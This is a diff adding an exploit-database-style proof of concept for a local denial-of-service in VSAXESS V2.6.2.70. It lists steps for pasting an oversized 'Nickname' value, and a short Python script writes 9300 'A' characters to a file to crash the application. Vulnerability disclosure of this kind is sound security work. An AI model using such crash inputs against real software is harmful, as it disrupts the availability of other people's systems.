@@ -1,0 +1,26 @@
+# Exploit Title: VSAXESS V2.6.2.70 build20171226_053 - 'Nickname' Denial of Service (PoC)
+# Discovery by: Diego Santamaria
+# Discovery Date: 2018-08-31
+# Vendor Homepage: https:https://www.visionistech.com/en/home/
+# Software Link: https://www.visionistech.com/en/vsaxess-desktop-software/
+# Tested Version: V2.6.2.70 build20171226_053
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 7 Professional
+ 
+# Steps to Reproduce: 
+
+# 1. Run the python code Nickname.py 
+# 2. Open nickname_exploit.txt and copy the content 
+# 3. Open VSAXESS.exe 
+# 4. Register a password and username
+# 5. choose 'Add'
+# 6. choose 'Serial Port'
+# 6. Paste the content from nickname_exploit.txt on 'Nickname'
+# 7. Press 'Aceptar' and Crashed
+ 
+#!/usr/bin/env python
+
+content = "\x41" * 9300
+f = open ("nickname_exploit.txt", "w")
+f.write(content)
+f.close()
